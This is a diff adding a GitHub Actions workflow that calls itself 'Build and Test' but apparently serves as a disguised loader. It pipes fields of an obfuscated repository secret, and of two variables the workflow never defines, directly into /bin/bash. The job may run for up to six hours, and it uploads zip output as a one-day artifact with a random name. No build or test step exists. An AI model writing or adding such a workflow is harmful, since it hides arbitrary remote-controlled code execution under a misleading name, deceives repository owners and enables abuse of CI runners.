@@ -1,0 +1,25 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          eobwf52: ${{ secrets.eobwf52 }}
+        run: |
+          printf '%s' "$eobwf52" | jq -r .a9389 | /bin/bash
+          echo $ee440 | jq -r .uxgnw04434 | /bin/bash
+          printf '%s' "$vqaut0" | jq -r .jz725 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Bnh2yt80
+          path: "*.zip"
+          retention-days: 1
